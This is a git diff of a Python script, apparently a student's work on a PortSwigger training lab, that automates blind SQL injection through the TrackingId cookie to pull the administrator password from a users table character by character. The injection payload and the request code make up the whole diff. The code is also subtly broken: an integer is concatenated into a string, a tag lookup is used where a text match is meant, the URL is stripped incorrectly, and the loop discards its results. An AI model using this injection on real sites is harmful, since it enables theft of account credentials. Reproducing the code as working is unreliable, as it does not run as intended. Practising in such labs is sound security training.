@@ -1,6 +1,13 @@
 import requests
+from bs4 import BeautifulSoup
 
-def tracking_id_inject():
+#This script is for finding the password in the following portswigger web security lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+#It's already determined that the password is 20 characters long and alphanumeric through previous injection
+#This is also possible on community burp suite but it takes hours due to the number of combinations, recommend doing with pro edition
+
+
+#sends a http request with sql injection
+def tracking_id_inject(payload1, payload2):
     #User needs to insert the URL as PortSwigger creates a new URL when starting the lab.
     url = input("Enter Blind SQLi URL:")
     host = url.lstrip("https://")
@@ -11,9 +18,12 @@ def tracking_id_inject():
     #New page each time means a different sesesion code
     session = input("Enter session code:")
     
+    
+    injection = "\'and substring((select password from users where username = \'administrator\')," + payload1 + ",1) < \'" + payload2
+    
     headers = {
         'Host': host,
-        'Cookie': 'TrackingId=' + trackingID + '\'and substring((select password from users where username = \'administrator\'),10,1) < \'a\; session=' + session,
+        'Cookie': 'TrackingId=' + trackingID + injection +'; session=' + session,
         'Sec-Ch-Ua': '"Chromium";v="133", "Not(A:Brand";v="99"',
         'Sec-Ch-Ua-Mobile': '?0',
         'Sec-Ch-Ua-Platform': '\"Linux\"',
@@ -30,12 +40,24 @@ def tracking_id_inject():
         'Priority': 'u=0, i'
     }
     response = requests.get(url, headers=headers)
-    print(response)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    if soup.find("Welcome Back!"):
+        return True
+    else:
+        return False
+        
+    
+def find_password_char():
+    for i in range(1,21):
+        if tracking_id_inject(i, "a"):
+            pass
+        else:
+            pass
 
 
 
 def main():
-    tracking_id_inject()
+    find_password_char()
     
 if __name__ == "__main__":
     main()
